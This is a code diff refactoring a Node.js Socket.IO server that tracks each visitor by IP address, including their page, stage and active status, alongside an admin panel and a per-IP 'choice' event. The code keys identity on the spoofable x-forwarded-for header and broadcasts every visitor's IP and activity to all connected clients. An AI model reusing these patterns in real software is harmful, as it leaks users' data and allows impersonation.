@@ -217,57 +217,35 @@ app.get('/admin/panel', checkAdminSession, (req, res) => {
 
 
 io.on('connection', (socket, req) => {
-    let user = null;
-    let page = null;
-    let stage = null;
-    let userIP = socket.request.headers['x-forwarded-for'];
-    let entriesArray = Array.from(sessionStore.entries());
+  let userIP = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
+    userIP = userIP.split(',')[0].trim();
     
-    if (userIP) {
-        // Split the string by comma and take the first element
-        userIP = userIP.split(',')[0].trim();
-    } else {
-        // Fallback to remoteAddress if x-forwarded-for is not set
-        userIP = userIP.request.connection.remoteAddress;
-    }
-    
-    socket.join(userIP)
+    socket.join(userIP);
 
+    // Directly update sessionStore
     if (!sessionStore.has(userIP)) {
-        sessionStore.set(userIP, {  
-        ip: userIP,
-        status: 'actif',
-        page: page,
-        stage: stage });
-        entriesArray = Array.from(sessionStore.entries());
+        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null });
     } else {
-         entriesArray.forEach(([ipAddress, details]) => {
-            if(details.ip == userIP){
-              details.status = 'actif'
-                sessionStore.set(ipAddress, details)
-            }
-        });
-
+        let userDetails = sessionStore.get(userIP);
+        userDetails.status = 'actif';
+        sessionStore.set(userIP, userDetails);
     }
+    io.emit('join', Array.from(sessionStore.entries()));
 
     socket.on('pageandstage', (data) => {
-         entriesArray.forEach(([ipAddress, details]) => {
-            if(details.ip == userIP){
-                details.page = data.page
-                details.stage = data.stage
-                sessionStore.set(ipAddress, details)
-            }
-        });
-    
-        io.emit('join', entriesArray)
-        entriesArray = Array.from(sessionStore.entries());
-    
-    })
+        if (sessionStore.has(userIP)) {
+            let userDetails = sessionStore.get(userIP);
+            userDetails.page = data.page;
+            userDetails.stage = data.stage;
+            sessionStore.set(userIP, userDetails);
+        }
+        io.emit('join', Array.from(sessionStore.entries()));
+    });
 
-    socket.on('getUserData', () => {
-        console.log(entriesArray)
-        io.emit('setUserData', entriesArray)
-    })
+   socket.on('getUserData', () => {
+    io.emit('setUserData', Array.from(sessionStore.entries()));
+});
+
     
     socket.on('submit', (data) => {
         if(userIP){
@@ -314,29 +292,14 @@ io.on('connection', (socket, req) => {
         io.to(ip).emit('choice', data)
     });
 
-    socket.on('disconnect', () => {
-    
-            if (sessionStore.has(userIP)) {
-                 
-                entriesArray.forEach(([ipAddress, details]) => {
-            if(details.ip == userIP){
-              details.status = 'inactif'
-                sessionStore.set(ipAddress, details)
-            }
-        });
-        
-    
-        io.emit('leave', entriesArray)
-                entriesArray = Array.from(sessionStore.entries());
-    }
-
-    })
-
-    entriesArray = Array.from(sessionStore.entries());
-    
-    io.emit('join', entriesArray)
-    
-
+  socket.on('disconnect', () => {
+        if (sessionStore.has(userIP)) {
+            let userDetails = sessionStore.get(userIP);
+            userDetails.status = 'inactif';
+            sessionStore.set(userIP, userDetails);
+            io.emit('leave', Array.from(sessionStore.entries()));
+        }
+    });
 
 });
 
